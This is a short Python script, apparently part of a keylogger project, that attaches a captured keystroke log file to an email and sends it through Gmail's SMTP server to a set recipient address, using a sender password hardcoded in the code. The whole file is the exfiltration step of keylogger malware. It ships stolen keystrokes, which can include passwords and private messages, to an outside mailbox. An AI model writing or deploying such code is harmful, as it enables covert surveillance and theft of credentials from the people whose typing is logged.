import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 

fromaddr = "fromk@gmail.com"#sender email address
toaddr = "to@gmail.com"#recipient email address

# instance of MIMEMultipart 
msg = MIMEMultipart() 

msg['From'] = fromaddr 
msg['To'] = toaddr 
msg['Subject'] = "keylogger"
body = "Please find the keylogger log file in the attachment"
msg.attach(MIMEText(body, 'plain')) 
filename = "key.log"
attachment = open("/home/hritik/keylogger/key.log", "rb") 
p = MIMEBase('application', 'octet-stream') 
p.set_payload((attachment).read()) 
encoders.encode_base64(p) 

p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
msg.attach(p) 

# creates SMTP session 
s = smtplib.SMTP('smtp.gmail.com', 587) 
s.starttls() 
s.login(fromaddr, "Github@123") #Your sender account password

# Converts the Multipart msg into a string 
text = msg.as_string() 
s.sendmail(fromaddr, toaddr, text) 

s.quit() 
